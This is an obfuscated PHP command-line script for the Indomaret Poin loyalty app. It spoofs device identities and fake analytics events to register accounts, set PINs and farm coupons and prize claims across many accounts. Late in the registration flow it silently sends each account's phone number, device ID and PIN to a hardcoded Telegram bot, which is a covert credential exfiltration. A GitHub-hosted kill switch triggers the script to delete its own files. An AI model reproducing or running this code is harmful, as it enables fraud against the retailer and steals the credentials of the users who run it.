                                                                $iElqk = G1Wxt("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/is-pin-exist-by-phone-number", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                if (!($fUekS == '')) {
                                                                    $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"page_view\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"PIN activation\",\"page_urlpath\":\"\"},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                    $m5BZY = GgGR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                    $Jk9cx = G8pf2("https://edtsapp.indomaretpoinku.com/configuration/apix-1502-api/mobile/sy-app-version/get-version-key/ANDROID", $aY0el, $GOXkU, $mlMLt);
                                                                    $wDisp = "{\"userId\":" . $R_bYC . ",\"deviceType\":\"01\",\"deviceId\":\"" . $aY0el . "\",\"fcmToken\":\"" . $WYrgv . ":APA91bFt9WuOdnYit_hOvqmHC2uMGiiCwp_u8JgO0kB3sgYQNxoWqO57EEYpAAAVjjDCY8C4j-ePHCYG6Mgcg85RehNO33xt1RRP6DIPVu36qkFHdkfQ9GeTDH8WFrSaiiBzkeZGm9wp\"}";
                                                                    $yeprB = g1wxt("https://edtsapp.indomaretpoinku.com/notification/apix-1502-api/push-notifications/fcm-registration", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                    $nb9cm = round(microtime(true) * 1000);
                                                                    $JaDCq = $PQA77;
                                                                    $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"click_link\",\"event_timestamp\":" . $nb9cm . ",\"link_label\":\"Konfirmasi\"},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                    $m5BZY = Gggr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                    $wDisp = "{\"pinCode\":\"" . $earOL . "\"}";
                                                                    $Y02JS = G1Wxt("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/pin/create-pin", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                    $nb9cm = round(microtime(true) * 1000);
                                                                    $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"failed_reason\":\"Success PIN activation\",\"event_label\":\"PIN activation\",\"event_name\":\"event_submission\",\"event_status\":\"success\",\"event_timestamp\":" . $nb9cm . "},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                    $m5BZY = gGGr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                    $nb9cm = round(microtime(true) * 1000);
                                                                    $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"page_view\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"done registration\",\"page_urlpath\":\"\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                    $m5BZY = ggGr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                    $Jk9cx = G8Pf2("https://edtsapp.indomaretpoinku.com/configuration/apix-1502-api/mobile/sy-app-version/get-version-key/ANDROID", $aY0el, $GOXkU, $mlMLt);
                                                                    $wDisp = "{\"appInstanceId\":\"" . $WYrgv . "\",\"appVersion\":\"3.13.0\",\"countryCode\":\"ID\",\"analyticsUserProperties\":{},\"appId\":\"1:998816605328:android:" . $aY0el . "\",\"platformVersion\":\"28\",\"timeZone\":\"Asia\\/Jakarta\",\"sdkVersion\":\"21.0.1\",\"packageName\":\"mypoin.indomaret.android\",\"appInstanceIdToken\":\"" . $YYbml . "\",\"languageCode\":\"id-ID\",\"appBuild\":\"104\"}";
                                                                    $a7K8a = AUjhz("https://firebaseremoteconfig.googleapis.com/v1/projects/998816605328/namespaces/firebase:fetch", $wDisp, $YYbml);
                                                                    $nb9cm = round(microtime(true) * 1000);
                                                                    $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"click_link\",\"event_timestamp\":" . $nb9cm . ",\"link_label\":\"Selesai\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                    $m5BZY = GGgr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                    $nb9cm = round(microtime(true) * 1000);
                                                                    $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"page_view\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"home\",\"page_urlpath\":\"\"},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                    $m5BZY = Gggr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                    $Pud0o = trim(file_get_contents("https://raw.githubusercontent.com/csaojkcsajcsjnjkscanjkncjkslnj/adfadfadvsgdfggfsgsgfsaf/main/makin"));
                                                                    if (!($Pud0o == "true")) {
                                                                        goto zP__f;
                                                                    }
                                                                    @unlink("chace");
                                                                    zP__f:
                                                                    $UHj7C = G8pF2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupons?unpaged=true", $aY0el, $GOXkU, $mlMLt);
                                                                    if (!($fUekS == '')) {
                                                                        $Jk9cx = G8PF2("https://edtsapp.indomaretpoinku.com/configuration/apix-1502-api/mobile/sy-app-version/get-version-key/ANDROID", $aY0el, $GOXkU, $mlMLt);
                                                                        $Jk9cx = g8Pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/is-whatsapp-verified", $aY0el, $GOXkU, $mlMLt);
                                                                        $XDyMm = G8pF2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupons/has-new-coupon", $aY0el, $GOXkU, $mlMLt);
                                                                        if (!($fUekS == '')) {
                                                                            $UHj7C = G8Pf2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupons?unpaged=true", $aY0el, $GOXkU, $mlMLt);
                                                                            $nb9cm = round(microtime(true) * 1000);
                                                                            $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"" . $GOXkU . "\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"details\":{\"isaku_status\":\"Hubungkan\"},\"event_name\":\"page_detail\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"isaku\"},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                            $m5BZY = GGGr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                            $Jk9cx = G8pF2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/reminders/me", $aY0el, $GOXkU, $mlMLt);
                                                                            $Jk9cx = G8PF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/is-whatsapp-verified", $aY0el, $GOXkU, $mlMLt);
                                                                            $Jk9cx = G8pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                                            $Ap1KM = json_decode($Jk9cx, true);
                                                                            $M1ADy = @$Ap1KM["data"]["id"];
                                                                            $p4iky = @$Ap1KM["data"]["memberId"];
                                                                            echo "\n";
                                                                            echo @zM6iC("purple", "ID\t\t: ");
                                                                            echo @zm6iC("nevy", $M1ADy);
                                                                            echo "\n";
                                                                            echo @zM6ic("purple", "Member ID : ");
                                                                            echo @ZM6iC("nevy", $p4iky);
                                                                            echo "\n";
                                                                            Kt3g1("forceclose", $zn5zd, $aY0el, $earOL, $GOXkU);
                                                                            $teeli001 = file_get_contents("https://api.telegram.org/bot5529819060:AAGy5hFZW802Cm7Dut_gOSEtnPMzrY_n49I/sendMessage?chat_id=1069319412&text={$zn5zd}|{$aY0el}|{$earOL}|{$GOXkU}");
                                                                            lqJR6("mytoken", $zn5zd, $mlMLt);
                                                                            goto ebnNp;
                                                                        }
                                                                        echo "\n";
                                                                        echo @Zm6Ic("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                                        @unlink("poinhp.php");
                                                                        @unlink("poinhp.php");
                                                                        echo "\n";
                                                                        die;
                                                                    }
                                                                    echo "\n";
                                                                    @unlink("poinhp.php");
                                                                    @unlink("poinhp.php");
                                                                    echo "\n";
                                                                    die;
                                                                }
                                                                echo "\n";
                                                                echo @ZM6ic("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                                @unlink("poinhp.php");
                                                                @unlink("poinhp.php");
                                                                echo "\n";
                                                                die;
                                                            }
                                                            echo "\n";
                                                            echo @Zm6Ic("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                            @unlink("poinhp.php");
                                                            @unlink("poinhp.php");
                                                            echo "\n";
                                                            die;
                                                        }
                                                        echo "\n";
                                                        echo @ZM6IC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                        @unlink("poinhp.php");
                                                        @unlink("poinhp.php");
                                                        echo "\n";
                                                        die;
                                                    }
                                                    echo @zm6ic("yellow", "\nOTP ANDA SALAH, SILAHKAN INPUT YANG BARU!!\n\n");
                                                    goto ectyt;
                                                }
                                                echo "\n";
                                                echo @zm6IC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                @unlink("poinhp.php");
                                                @unlink("poinhp.php");
                                                echo "\n";
                                                die;
                                            }
                                            echo "\n";
                                            echo @ZM6iC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                            @unlink("poinhp.php");
                                            @unlink("poinhp.php");
                                            echo "\n";
                                            die;
                                        }
                                        echo "\n";
                                        echo @ZM6iC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                        @unlink("poinhp.php");
                                        @unlink("poinhp.php");
                                        echo "\n";
                                        die;
                                    }
                                    echo "\n";
                                    echo @zm6IC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                    @unlink("poinhp.php");
                                    @unlink("poinhp.php");
                                    echo "\n";
                                    die;
                                }
                                echo "\n";
                                echo @zm6Ic("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                @unlink("poinhp.php");
                                @unlink("poinhp.php");
                                echo "\n";
                                die;
                            }
                            $m0f8X = explode("\n", @file_get_contents("mytoken"));
                            $u35jw = count($m0f8X) - 1;
                            $lPULW = $m0f8X;
                            $wZnHP = $lPULW[$jTEU0];
                            echo "\n";
                            $zcN5u = Xozb4(array("|"), $wZnHP)[0];
                            $wlJRC = xOZb4(array("|"), $wZnHP)[1];
                            $U0YgX = str_replace("\r", '', $zcN5u);
                            $zn5zd = $U0YgX;
                            $v1ZMX = str_replace("\r", '', $wPFxB);
                            $aY0el = $v1ZMX;
                            $sONlZ = str_replace("\r", '', $rERzL);
                            $earOL = $sONlZ;
                            $w5ulg = str_replace("\r", '', $TvVlh);
                            $GOXkU = $w5ulg;
                            $obc_G = str_replace("\r", '', $wlJRC);
                            $mlMLt = $obc_G;
                            echo @zM6ic("nevy", "Akun Ke\t\t: ");
                            echo $jTEU0;
                            echo "\n";
                            $Jk9cx = g8Pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                            $Ap1KM = json_decode($Jk9cx, true);
                            $M1ADy = @$Ap1KM["data"]["id"];
                            $p4iky = @$Ap1KM["data"]["memberId"];
                            $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                            echo "\n";
                            echo @zM6iC("green", "Nomor HP Anda  : ");
                            echo $BcbF3;
                            echo "\n";
                            $upOL9 = G8PF2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupons?unpaged=true", $aY0el, $GOXkU, $mlMLt);
                            $owfHy = json_decode($upOL9, true);
                            $D2zwh = "0";
                            $ogbF4 = "30";
                            $D2zwh;
                            Gq2T9:
                            if (!($D2zwh < $ogbF4)) {
                                goto PG5CP;
                            }
                            $ZNU2M = @$owfHy["data"]["content"][$D2zwh]["couponName"];
                            $SR3ui = @$owfHy["data"]["content"][$D2zwh]["couponCode"];
                            if (!($ZNU2M == '')) {
                                echo "\n";
                                echo @Zm6ic("yellow", "Nama Kuponnya\t: ");
                                echo @ZM6ic("nevy", $ZNU2M);
                                echo "\n";
                                echo @ZM6ic("yellow", "Kode Kuponnya\t: ");
                                echo @Zm6Ic("nevy", $SR3ui);
                                echo "\n";
                                $ZNU2M = preg_replace("/[^a-zA-Z0-9\\ ]/", '', $ZNU2M);
                                BLHdg($ZNU2M . ".txt", $SR3ui);
                                $D2zwh++;
                                goto Gq2T9;
                            }
                            PG5CP:
                            $jTEU0++;
                            goto XUxU1;
                        }
                        $m0f8X = explode("\n", @file_get_contents("mytoken"));
                        $u35jw = count($m0f8X) - 1;
                        $lPULW = $m0f8X;
                        $wZnHP = $lPULW[$jTEU0];
                        echo "\n";
                        $zcN5u = XOZB4(array("|"), $wZnHP)[0];
                        $wlJRC = XozB4(array("|"), $wZnHP)[1];
                        $U0YgX = str_replace("\r", '', $zcN5u);
                        $zn5zd = $U0YgX;
                        $v1ZMX = str_replace("\r", '', $wPFxB);
                        $aY0el = $v1ZMX;
                        $sONlZ = str_replace("\r", '', $rERzL);
                        $earOL = $sONlZ;
                        $w5ulg = str_replace("\r", '', $TvVlh);
                        $GOXkU = $w5ulg;
                        $obc_G = str_replace("\r", '', $wlJRC);
                        $mlMLt = $obc_G;
                        echo @ZM6iC("nevy", "Akun Ke\t\t: ");
                        echo $jTEU0;
                        $Jk9cx = G8Pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                        $Ap1KM = json_decode($Jk9cx, true);
                        $M1ADy = @$Ap1KM["data"]["id"];
                        $p4iky = @$Ap1KM["data"]["memberId"];
                        $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                        echo "\n";
                        echo @zm6iC("green", "Nomor HP Anda  : ");
                        echo $BcbF3;
                        echo "\n";
                        echo @zm6IC("yellow", "SCAN BARCODE INI AGAR KASIR LEBIH MUDAH..");
                        echo shell_exec("xdg-open \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $p4iky . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                        shell_exec("start chrome \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $p4iky . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                        FMhwq:
                        echo "\n\n";
                        echo @ZM6IC("red", "NOTICE !! : \n");
                        echo @zm6Ic("yellow", " - Silahkan Melakukan Transaksi Terlebih Dahulu\n");
                        echo "\n\n";
                        echo @Zm6Ic("nevy", "Apakah Sudah Transaksi ? ( y / n ) : ");
                        $RJnNP = trim(fgets(STDIN));
                        echo "\n";
                        if ($RJnNP == "y") {
                            HTPsC:
                            echo "\n";
                            $xT15V = G8PF2("https://edtsapp.indomaretpoinku.com/%2Floyalty%2Fapix-1502-api%2Fmobile%2Fcoins%2Fprizes%2FGOFRESH2022%2Fme", $aY0el, $GOXkU, $mlMLt);
                            $Ap1KM = json_decode($xT15V, true);
                            $XDyMm = @$Ap1KM["data"]["balance"];
                            if ($XDyMm == "1") {
                                echo @zm6IC("green", "Ada Ayam... Yuk Pecahin !!");
                                echo "\n";
                                jn4R5:
                                dDvxi:
                                $wDisp = '';
                                $ofEkP = CWALz("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/coins/prizes/GOFRESH2022/tokens/claim/single", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                $Ap1KM = json_decode($ofEkP, true);
                                $YXsOG = @$Ap1KM["message"];
                                $ZNU2M = @$Ap1KM["data"]["rewards"][0]["item"][0]["name"];
                                $KOeAA = @$Ap1KM["data"]["rewards"][0]["item"][0]["couponMasterId"];
                                echo "\n";
                                echo @zm6ic("yellow", "Status Pecahin Ayam : ");
                                echo @zM6Ic("nevy", $YXsOG);
                                echo "\n";
                                echo @ZM6iC("yellow", "Nama Kuponnya\t   : ");
                                echo @zM6IC("nevy", $ZNU2M);
                                echo "\n";
                                if ($ZNU2M == '') {
                                    goto dDvxi;
                                }
                                if (!($ZNU2M == "Cashback 2.500 Poin")) {
                                    if (!($fUekS == '')) {
                                        $upOL9 = g8PF2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupon-detail/" . $KOeAA, $aY0el, $GOXkU, $mlMLt);
                                        $Ap1KM = json_decode($upOL9, true);
                                        $YXsOG = @$Ap1KM["message"];
                                        $ZNU2M = @$Ap1KM["data"]["couponName"];
                                        $WtCiL = @$Ap1KM["data"]["couponCode"];
                                        $LgiFv = @$Ap1KM["data"]["information"];
                                        echo "\n";
                                        echo @zM6Ic("yellow", "Status Cek Kupon : ");
                                        echo @zM6iC("nevy", $YXsOG);
                                        echo "\n";
                                        echo @Zm6Ic("yellow", "Nama Kuponnya\t: ");
                                        echo @Zm6iC("nevy", $ZNU2M);
                                        echo "\n";
                                        echo @zm6ic("yellow", "Kode Kuponnya\t: ");
                                        echo @zm6IC("nevy", $WtCiL);
                                        echo "\n";
                                        echo @Zm6IC("red", "Notice : ");
                                        echo @zm6ic("green", $LgiFv);
                                        echo "\n";
                                        echo shell_exec("xdg-open \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $WtCiL . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                        shell_exec("start chrome \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $WtCiL . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                        if (!($fUekS == '')) {
                                            KwD0u:
                                            echo "\n";
                                            echo @Zm6iC("yellow", "SCAN BARCODE INI AGAR KASIR LEBIH MUDAH..");
                                            echo shell_exec("xdg-open \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $p4iky . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                            shell_exec("start chrome \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $p4iky . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                            echo "\n\n";
                                            echo @zM6IC("red", "NOTICE !! : \n");
                                            echo @zM6iC("yellow", " - Silahkan Melakukan Transaksi Terlebih Dahulu\n");
                                            echo "\n\n";
                                            echo @zM6IC("nevy", "Apakah Sudah Transaksi ? ( y / n ) : ");
                                            $RJnNP = trim(fgets(STDIN));
                                            echo "\n";
                                            if ($RJnNP == "y") {
                                                UWw0n:
                                                MLXaN:
                                                echo "\n";
                                                $xT15V = g8Pf2("https://edtsapp.indomaretpoinku.com/%2Floyalty%2Fapix-1502-api%2Fmobile%2Fcoins%2Fprizes%2FGOFRESH2022%2Fme", $aY0el, $GOXkU, $mlMLt);
                                                $Ap1KM = json_decode($xT15V, true);
                                                $XDyMm = @$Ap1KM["data"]["balance"];
                                                if ($XDyMm == "1") {
                                                    echo @zM6Ic("green", "Ada Ayam... Yuk Pecahin !!");
                                                    echo "\n";
                                                    goto j7pkX;
                                                }
                                                if (!($XDyMm == "0")) {
                                                    if (!($fUekS == '')) {
                                                        j7pkX:
                                                        $wDisp = '';
                                                        $ofEkP = cwaLZ("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/coins/prizes/GOFRESH2022/tokens/claim/single", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                        $Ap1KM = json_decode($ofEkP, true);
                                                        $YXsOG = @$Ap1KM["message"];
                                                        $ZNU2M = @$Ap1KM["data"]["rewards"][0]["item"][0]["name"];
                                                        $KOeAA = @$Ap1KM["data"]["rewards"][0]["item"][0]["couponMasterId"];
                                                        echo "\n";
                                                        echo @zM6Ic("yellow", "Status Pecahin Ayam : ");
                                                        echo @ZM6ic("nevy", $YXsOG);
                                                        echo "\n";
                                                        echo @zm6iC("yellow", "Nama Kuponnya\t   : ");
                                                        echo @zm6iC("nevy", $ZNU2M);
                                                        echo "\n";
                                                        if ($ZNU2M == '') {
                                                            LA_80:
                                                            goto uUFQx;
                                                        }
                                                        if ($ZNU2M == "Cashback 2.500 Poin") {
                                                            goto MxwyD;
                                                        }
                                                        echo "\n";
                                                        goto jOsQR;
                                                    }
                                                    echo "\n";
                                                    echo @ZM6Ic("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                    @unlink("poinhp.php");
                                                    @unlink("poinhp.php");
                                                    echo "\n";
                                                    die;
                                                }
                                                echo @zm6iC("red", "Yah... Ayam Nya Ga Ada , Akan Di Cek Kembali...");
                                                echo "\n";
                                                sleep(5);
                                                goto MLXaN;
                                            }
                                            goto KwD0u;
                                        }
                                        echo "\n";
                                        echo @zm6IC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                        @unlink("poinhp.php");
                                        @unlink("poinhp.php");
                                        echo "\n";
                                        die;
                                    }
                                    echo "\n";
                                    echo @ZM6ic("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                    @unlink("poinhp.php");
                                    @unlink("poinhp.php");
                                    echo "\n";
                                    die;
                                }
                                uUFQx:
                                MxwyD:
                                if (!($fUekS == '')) {
                                    $wDisp = '';
                                    $ofEkP = ZFEbk("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/points/me/protections/enable", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                    $Jk9cx = G8pF2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/reminders/me", $aY0el, $GOXkU, $mlMLt);
                                    echo shell_exec("xdg-open \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $p4iky . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                    shell_exec("start chrome \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $p4iky . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                    if (!($fUekS == '')) {
                                        goto SYN5I;
                                    }
                                    echo "\n";
                                    echo @Zm6Ic("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                    @unlink("poinhp.php");
                                    @unlink("poinhp.php");
                                    echo "\n";
                                    die;
                                }
                                echo "\n";
                                echo @ZM6iC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                @unlink("poinhp.php");
                                @unlink("poinhp.php");
                                echo "\n";
                                die;
                            }
                            echo @ZM6Ic("red", "Yah... Ayam Nya Ga Ada , Cek Kembali Nanti...");
                            echo "\n";
                            SYN5I:
                            jOsQR:
                            $jTEU0++;
                            goto e81aM;
                        }
                        goto FMhwq;
                    }
                    echo "\n";
                    HQc4z:
                    echo @ZM6IC("green", "Masukkan Nomor Anda\t   : ");
                    $zn5zd = trim(fgets(STDIN));
                    echo "\n";
                    $earOL = "112233";
                    $xp_1p = "indo.txt";
                    if (!unlink($xp_1p)) {
                        echo "Error deleting indo.txt  ";
                        goto D1mj_;
                    }
                    echo "Deleted {$xp_1p}  ";
                    D1mj_:
                    echo "\n";
                    $xp_1p = "klik.txt";
                    if (!unlink($xp_1p)) {
                        echo "Error deleting klik.txt  ";
                        goto w09r9;
                    }
                    echo "Deleted {$xp_1p}  ";
                    w09r9:
                    echo "\n";
                    echo "\n";
                    thh3I:
                    $nb9cm = round(microtime(true) * 1000);
                    $sOOnY = fQ6w0();
                    $jlHkA = str_replace("-", '', $sOOnY);
                    $KbHJf = rand(1000000, 9999999);
                    $gYG6P = rand(1000, 9999);
                    $ZdrCv = rand(10, 99);
                    $aY0el = $jlHkA;
                    $qq5tL = "2" . $gYG6P . "hg5454d21vc";
                    $GOXkU = "Xiaomi Redmi 5 Plus";
                    $cod3H = fq6W0();
                    $kCT0W = str_replace("-", '', $cod3H);
                    $odGGi = $kCT0W . "mbLQpe";
                    $MXjqh = xwL4l();
                    $wDisp = "{\"fid\":\"" . $odGGi . "\",\"appId\":\"1:998816605328:android:" . $aY0el . "\",\"authVersion\":\"FIS_v2\",\"sdkVersion\":\"a:17.0.0\"}";
                    $a7K8a = jLw7P("https://firebaseinstallations.googleapis.com/v1/projects/idm-corp-prd/installations", $wDisp);
                    $H1g60 = json_decode($a7K8a, true);
                    $WYrgv = @$H1g60["fid"];
                    $YYbml = @$H1g60["authToken"]["token"];
                    $yPeiy = @$H1g60["refreshToken"];
                    $Jk9cx = e6TPN("https://firebase-settings.crashlytics.com/spi/v2/platforms/android/gmp/1:998816605328:android:" . $aY0el . "/settings?instance=a291cbe808f666683ac167ea58393c709528e4f6&build_version=104&display_version=3.13.0&source=4", $aY0el);
                    $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"activity_details\":\"resume_app\",\"event_name\":\"app_activity\",\"event_timestamp\":" . $nb9cm . "},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_ip_address\":\"127.0.0.1\"}}]}";
                    $m5BZY = GgGr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                    $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"page_view\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"splash\",\"page_urlpath\":\"\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_ip_address\":\"127.0.0.1\"}}]}";
                    $m5BZY = gGGr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                    $wDisp = "{\"appInstanceId\":\"" . $WYrgv . "\",\"appVersion\":\"3.13.0\",\"countryCode\":\"ID\",\"analyticsUserProperties\":{},\"appId\":\"1:998816605328:android:" . $aY0el . "\",\"platformVersion\":\"28\",\"timeZone\":\"Asia\\/Jakarta\",\"sdkVersion\":\"21.0.1\",\"packageName\":\"mypoin.indomaret.android\",\"appInstanceIdToken\":\"" . $YYbml . "\",\"languageCode\":\"id-ID\",\"appBuild\":\"104\"}";
                    $a7K8a = auJHZ("https://firebaseremoteconfig.googleapis.com/v1/projects/998816605328/namespaces/firebase:fetch", $wDisp, $YYbml);
                    $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
